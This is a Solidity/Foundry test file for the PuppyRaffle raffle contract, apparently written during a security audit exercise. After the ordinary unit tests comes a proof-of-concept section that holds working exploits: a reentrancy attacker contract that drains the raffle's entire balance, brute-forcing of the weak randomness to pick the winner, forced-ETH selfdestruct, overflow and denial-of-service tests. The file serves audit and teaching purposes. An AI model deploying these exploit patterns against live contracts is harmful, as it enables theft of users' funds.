// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

// @audit-info Test coverage is poor
/*
╭------------------------------+----------------+-----------------+----------------+----------------╮
| File                         | % Lines        | % Statements    | % Branches     | % Funcs        |
+===================================================================================================+
| script/DeployPuppyRaffle.sol | 0.00% (0/4)    | 0.00% (0/4)     | 100.00% (0/0)  | 0.00% (0/1)    |
|------------------------------+----------------+-----------------+----------------+----------------|
| src/PuppyRaffle.sol          | 85.33% (64/75) | 85.88% (73/85)  | 69.23% (18/26) | 80.00% (8/10)  |
|------------------------------+----------------+-----------------+----------------+----------------|
| test/PuppyRaffleTest.t.sol   | 88.24% (15/17) | 92.31% (12/13)  | 100.00% (1/1)  | 80.00% (4/5)   |
|------------------------------+----------------+-----------------+----------------+----------------|
| Total                        | 82.29% (79/96) | 83.33% (85/102) | 70.37% (19/27) | 75.00% (12/16) |
╰------------------------------+----------------+-----------------+----------------+----------------╯
*/

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //////////////////////
    /// PoCs (Audit)    ///
    //////////////////////

    function _findCallerForWinnerIndex(uint256 desiredIndex, uint256 playersLen)
        internal
        view
        returns (address caller)
    {
        // Brute-force a sender address that yields the desired `winnerIndex`.
        // This models an attacker deploying/using many EOAs/contracts.
        for (uint256 i = 10; i < 5000; i++) {
            address candidate = address(uint160(i));
            uint256 idx =
                uint256(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % playersLen;
            if (idx == desiredIndex) {
                return candidate;
            }
        }
        return address(0);
    }

    // @test_audit PoC Weak RNG (H-2)
    function test_weakRngPoC() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        address caller = _findCallerForWinnerIndex(0, 4);
        assertTrue(caller != address(0));

        vm.prank(caller);
        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerOne);
    }

    // @test_audit PoC totalFees uint64 truncation DoS (M-2)
    function test_totalFeesTruncationPoC() public {
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(uint160(i + 10));
        }

        vm.deal(address(this), entranceFee * playersNumber);
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 contractBalance = address(puppyRaffle).balance;
        uint256 reportedFees = uint256(puppyRaffle.totalFees());
        assertTrue(contractBalance != reportedFees);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    // @test_audit PoC forced ETH locks withdrawFees (M-3)
    function test_forcedEthLocksWithdrawFeesPoC() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        ForceSend forceSend = new ForceSend{value: 1}();
        forceSend.destroy(payable(address(puppyRaffle)));

        assertEq(address(puppyRaffle).balance, uint256(puppyRaffle.totalFees()) + 1);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    // @test_audit PoC enterRaffle empty array accepted (L-2)
    function test_enterRaffleEmptyArrayPoC() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        address[] memory empty = new address[](0);
        puppyRaffle.enterRaffle{value: 0}(empty);

        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    // @test_audit PoC feeAddress can be zero (L-3)
    function test_feeAddressZeroPoC() public {
        PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(0), duration);
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        vm.deal(address(this), entranceFee * 4);
        raffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        raffle.selectWinner();

        uint256 zeroBefore = address(0).balance;
        uint256 expectedFees = ((entranceFee * 4) * 20) / 100;
        raffle.withdrawFees();
        assertEq(address(0).balance, zeroBefore + expectedFees);
    }

    // @test_audit PoC selectWinner reentrancy window (L-4)
    function test_selectWinnerReentrancyPoC() public {
        PrizeReenterer attacker = new PrizeReenterer(puppyRaffle);

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = address(attacker);

        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Ensure the attacker is selected as winner (index 3)
        address caller = _findCallerForWinnerIndex(3, 4);
        assertTrue(caller != address(0));
        vm.prank(caller);
        puppyRaffle.selectWinner();

        assertEq(puppyRaffle.previousWinner(), address(attacker));
        // If reentrancy happened, attacker enrolled itself as the first player of the next round.
        assertEq(puppyRaffle.players(0), address(attacker));
    }

    // @test_audit PoC DoS attack
    function test_dnialOfService() public {
        // Let´s enter 100 players
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(i);
        }
        
        // Set a non-zero gas price for this test
        uint256 customGasPrice = 1 gwei;
        vm.txGasPrice(customGasPrice);
        
        // see how much gas it takes to enter 100 players
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsed = gasStart - gasEnd;
        uint256 gasCost = gasUsed * tx.gasprice;
        
        console.log("Gas cost for 100 players:", gasCost / 1e9);

        // Now for the second 100 players
        address[] memory playersTwo = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            playersTwo[i] = address(i + playersNumber);
        }
        
        // see how much gas it takes to enter 100 players
        uint256 gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(playersTwo);
        uint256 gasEndTwo = gasleft();
        uint256 gasUsedTwo = gasStartTwo - gasEndTwo;
        uint256 gasCostTwo = gasUsedTwo * tx.gasprice;
        
        console.log("Gas used for sencond 100 players:", gasCostTwo / 1e9);
    }

    function test_totalFeesOverFlow() public {
        console.log("Total fees max for uint64:", uint256(type(uint64).max)/1e18);
        uint64 lastTotalFees = 0;
        bool anotherLoop = true;
        uint256 loop = 1;
        uint256 playersNumber = 100;
        do {
            address[] memory players = new address[](playersNumber);
            for (uint256 i = 0; i < playersNumber; i++) {
                players[i] = address(i);
            }
            
            // Enter players to the raffle
            puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);

            // Select the winner
            vm.warp(block.timestamp + duration + 1);
            vm.roll(block.number + 1);
            puppyRaffle.selectWinner();

            uint64 totalFees = puppyRaffle.totalFees();
            console.log("Total fees at loop %s: %s ETH", loop, uint256(totalFees/1e18));

            if (totalFees < lastTotalFees) {
                anotherLoop = false;
            }
            lastTotalFees = totalFees;
            loop++;
        } while (anotherLoop);
        console.log("-------------------");
        console.log("Total fees overflowed at loop %s with %s entries:", loop, playersNumber*loop);
    }

    function test_getFirstActivePlayerIndex() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 firstActivePlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        uint256 noActivePlayer = puppyRaffle.getActivePlayerIndex(playerTwo);
        // Player one is the first active player
        assertEq(puppyRaffle.players(0), playerOne);
        // The returned index for active player1 is 0
        assertEq(firstActivePlayer, 0);
        // The returned index for non-active player2 is 0
        assertEq(noActivePlayer, 0);
    }

    // @test_audit Refund reentrancy attack
    function test_reentracyRefund() public {
        ReentrancyAttacker reentrancyAttackerContract;
        reentrancyAttackerContract = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(reentrancyAttackerContract), 1 ether);

        // Let´s enter 100 players
        uint256 playersNumber = 100;
        address[] memory players = new address[](playersNumber);
        for (uint256 i = 0; i < playersNumber; i++) {
            players[i] = address(i);
        }
        
        // Enter 100 players to the raffle
        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);

        // Check balance before the attack
        console.log("PuppyRaffle balance before attack:", address(puppyRaffle).balance / 1e18);
        console.log("ReentrancyAttacker balance before attack:", address(reentrancyAttackerContract).balance / 1e18);
        console.log("-------------------");

        // Reentrancy attack contract starts the attack
        reentrancyAttackerContract.attack();

        // Check balance after attack
        console.log("PuppyRaffle balance after attack:", address(puppyRaffle).balance / 1e18);
        console.log("ReentrancyAttacker balance after attack:", address(reentrancyAttackerContract).balance / 1e18);
        console.log("-------------------");

        // Check the reentrancy attack count
        console.log("Reentrancy attack count:", reentrancyAttackerContract.attackCount());

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(reentrancyAttackerContract).balance, 101 ether);
        assertEq(reentrancyAttackerContract.attackCount(), 101);
    }
}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffleContract;
    uint256 public entraceFee;
    uint256 public playerIndex;
    
    uint256 public attackCount;

    constructor(PuppyRaffle _puppyRaffleContract) {
        puppyRaffleContract = _puppyRaffleContract;
        entraceFee = puppyRaffleContract.entranceFee();
    }

    function attack() public {
        // Enter the raffle
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffleContract.enterRaffle{value: entraceFee}(players);
        // Refund the entrance fee & start attack
        playerIndex = puppyRaffleContract.getActivePlayerIndex(address(this));
        puppyRaffleContract.refund(playerIndex);
    }

    function _stealMoney() internal {
        attackCount++;
        if (address(puppyRaffleContract).balance >= entraceFee) {
            puppyRaffleContract.refund(playerIndex);
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }
}

contract ForceSend {
    constructor() payable {}

    function destroy(address payable target) external {
        selfdestruct(target);
    }
}

contract PrizeReenterer {
    PuppyRaffle private immutable raffle;
    uint256 private immutable fee;
    bool private didReenter;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        fee = _raffle.entranceFee();
    }

    receive() external payable {
        if (didReenter) {
            return;
        }
        didReenter = true;
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: fee}(players);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        // IERC721Receiver.onERC721Received.selector
        return 0x150b7a02;
    }
}
